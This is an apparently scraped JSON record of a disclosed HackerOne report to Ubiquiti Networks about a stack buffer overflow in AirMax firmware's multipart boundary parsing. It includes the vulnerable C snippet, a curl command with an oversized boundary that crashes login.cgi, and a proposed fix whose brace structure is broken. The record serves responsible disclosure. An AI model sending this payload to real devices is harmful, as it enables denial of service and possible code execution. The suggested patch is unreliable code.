{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-03-08T21:58:48.841Z", 
    "voters": [
        "dyabla", 
        "pulnz"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 74004, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Other Buffer Overflow in PHP of the AirMax Products", 
    "is_member_of_team?": null, 
    "vote_count": 2, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-04-07T21:58:48.949Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-07-05T14:53:47.499Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-07-05T14:53:47.499Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "#Possible Solution\n```\nchar *getpost(void) {\n/* Some Code */\n    char *mb;\n    char boundary[100];\n\n/* Some Code */\n    if(!strncasecmp(buf,\"multipart/form-data\",19)) {\n        file_upload=1;\n        mb = strchr(buf,'='); //TODO: if character '=' is not found???\n        if(mb) strncpy(boundary,mb+1, sizeof(boundary)); //limit the size to copy\n        boundary[sizeof(boundary) - 1] = 0; //case sizeof(boundary) == strlen(mb+1), it will not allow a open string\n        else {\n            Error(\"File Upload Error: No MIME boundary found\"); \n            /* Some Code */\n            return(NULL);\n        }\n    }\n/* Rest of the Code */\n}\n```\n\nBut I recommend a Complete rework in the `post.c` and `uploadbuffer.c`.", 
            "markdown_message": "<h1 id=\"possible-solution\">Possible Solution</h1>\n<pre class=\"highlight plaintext\"><code>char *getpost(void) {\n/* Some Code */\n    char *mb;\n    char boundary[100];\n\n/* Some Code */\n    if(!strncasecmp(buf,&quot;multipart/form-data&quot;,19)) {\n        file_upload=1;\n        mb = strchr(buf,&#39;=&#39;); //TODO: if character &#39;=&#39; is not found???\n        if(mb) strncpy(boundary,mb+1, sizeof(boundary)); //limit the size to copy\n        boundary[sizeof(boundary) - 1] = 0; //case sizeof(boundary) == strlen(mb+1), it will not allow a open string\n        else {\n            Error(&quot;File Upload Error: No MIME boundary found&quot;); \n            /* Some Code */\n            return(NULL);\n        }\n    }\n/* Rest of the Code */\n}\n</code></pre>\n<p>But I recommend a Complete rework in the <code>post.c</code> and <code>uploadbuffer.c</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 499965, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-07-07T17:56:34.216Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-07-07T17:56:34.216Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "It remains vulnerable on v5.6.1.", 
            "markdown_message": "<p>It remains vulnerable on v5.6.1.</p>\n", 
            "type": "Activities::Comment", 
            "id": 502207, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-10-20T15:45:56.578Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-20T15:45:56.578Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "93c08539", 
                "url": "/93c08539"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 626261, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "93c08539", 
                "url": "/93c08539"
            }, 
            "created_at": "2015-10-20T15:46:27.180Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-20T15:46:27.180Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 626263, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-21T11:02:50.231Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-21T11:02:50.231Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Can I request public disclosure of this report and #74025, at the same time that #73480? (around January, Matt stipulated this data). By the way, Matt say something about a CVE of the #73480, it will happen?", 
            "markdown_message": "<p>Can I request public disclosure of this report and <a href=\"/reports/74025\">#74025</a>, at the same time that <a href=\"/reports/73480\">#73480</a>? (around January, Matt stipulated this data). By the way, Matt say something about a CVE of the <a href=\"/reports/73480\">#73480</a>, it will happen?</p>\n", 
            "type": "Activities::Comment", 
            "id": 627213, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-08T21:58:48.864Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-08T21:58:48.864Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 829857, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-07T21:59:06.703Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-07T21:59:06.703Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 895014, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "93c08539", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/93c08539", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/033/613/cf19d8cc729e17c9fd3dfa2bc561766ee0c83588_small.png?1536754955"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 2, 
        "name": "Memory Corruption - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -84070603.47973311, 
    "disclosed_at": "2016-04-07T21:59:06.653Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/74004", 
    "created_at": "2015-07-05T12:29:51.207Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>tldr: Just like happen in Report <a href=\"https://hackerone.com/reports/73491\">73491</a>, but <strong>MUCH WORSE</strong>.</p>\n\n<h1 id=\"the-vulnerability\">The Vulnerability</h1>\n\n<p>After the Report <a href=\"https://hackerone.com/reports/73491\">73491</a>, I decided to take another look in the code on  files<code>post.c</code> and <code>uploadbuffer.c</code> (once I have nothing better to do than watch F1).</p>\n\n<p>The problematic code:</p>\n<pre class=\"highlight plaintext\"><code>char *getpost(void) {\n/* Some Code */\n    char *mb;\n    char boundary[100];\n\n/* Some Code */\n    if(!strncasecmp(buf,&quot;multipart/form-data&quot;,19)) {\n        file_upload=1;\n        mb = strchr(buf,&#39;=&#39;);\n        if(mb) strcpy(boundary,mb+1);   //!!The problematic Line!!\n        else {\n            Error(&quot;File Upload Error: No MIME boundary found&quot;); \n            /* Some Code */\n            return(NULL);\n        }\n    }\n/* Rest of the Code */\n}\n</code></pre>\n<p>Has you can see, it&#39;s copied the string in <code>mb+1</code> to <code>boundary</code> ( witch have a fixed size), so will cause a <strong>Buffer Overflow</strong> if the string in <code>mb</code> (here represent <code>boundary</code> camp in a POST request) it&#39;s bigger than 100 bytes. In a <strong>Buffer Overflow</strong> which happen in stack memory, do a remote code execution should be easy (Even more on a AirMax, once the equipment are almost identical).</p>\n\n<h1 id=\"reproduce\">Reproduce</h1>\n\n<p>I will not create a exploit to this report, but unlike the Report <a href=\"https://hackerone.com/reports/73491\">73491</a>, you just have to ask for one.</p>\n\n<p>This Curl command will cause a buffer overflow.</p>\n<pre class=\"highlight plaintext\"><code>curl -X POST -H &quot;Content-Type: multipart/form-data; boundary=----------------------------dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd&quot; --data-binary AnyDataHERE &quot;https://192.168.1.20/login.cgi&quot; -k -v\n</code></pre>\n<p>Obs: Some times you need a bigger <code>boundary</code> (more <code>d</code>!!).</p>\n\n<p>The lighttpd will return <code>(mod_cgi.c.1319) cleaning up CGI: process died with signal 11</code>.</p>\n", 
    "vulnerability_information": "tldr: Just like happen in Report [73491](https://hackerone.com/reports/73491), but **MUCH WORSE**.\r\n\r\n#The Vulnerability\r\nAfter the Report [73491](https://hackerone.com/reports/73491), I decided to take another look in the code on  files`post.c` and `uploadbuffer.c` (once I have nothing better to do than watch F1).\r\n\r\nThe problematic code:\r\n```\r\nchar *getpost(void) {\r\n/* Some Code */\r\n\tchar *mb;\r\n\tchar boundary[100];\r\n\r\n/* Some Code */\r\n\tif(!strncasecmp(buf,\"multipart/form-data\",19)) {\r\n\t\tfile_upload=1;\r\n\t\tmb = strchr(buf,'=');\r\n\t\tif(mb) strcpy(boundary,mb+1);\t//!!The problematic Line!!\r\n\t\telse {\r\n\t\t\tError(\"File Upload Error: No MIME boundary found\"); \r\n\t\t\t/* Some Code */\r\n\t\t\treturn(NULL);\r\n\t\t}\r\n\t}\r\n/* Rest of the Code */\r\n}\r\n```\r\nHas you can see, it's copied the string in `mb+1` to `boundary` ( witch have a fixed size), so will cause a **Buffer Overflow** if the string in `mb` (here represent `boundary` camp in a POST request) it's bigger than 100 bytes. In a **Buffer Overflow** which happen in stack memory, do a remote code execution should be easy (Even more on a AirMax, once the equipment are almost identical).\r\n\r\n#Reproduce\r\nI will not create a exploit to this report, but unlike the Report [73491](https://hackerone.com/reports/73491), you just have to ask for one.\r\n\r\nThis Curl command will cause a buffer overflow.\r\n```\r\ncurl -X POST -H \"Content-Type: multipart/form-data; boundary=----------------------------dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\" --data-binary AnyDataHERE \"https://192.168.1.20/login.cgi\" -k -v\r\n```\r\nObs: Some times you need a bigger `boundary` (more `d`!!).\r\n\r\nThe lighttpd will return `(mod_cgi.c.1319) cleaning up CGI: process died with signal 11`.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://ubnt.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Ubiquiti Networks"
        }, 
        "handle": "ubnt", 
        "url": "https://hackerone.com/ubnt", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/800/19a040983c9b2494808c87f77337d30023b97ea7_small.png?1419364363", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 800, 
        "default_currency": "usd"
    }, 
    "is_published": false
}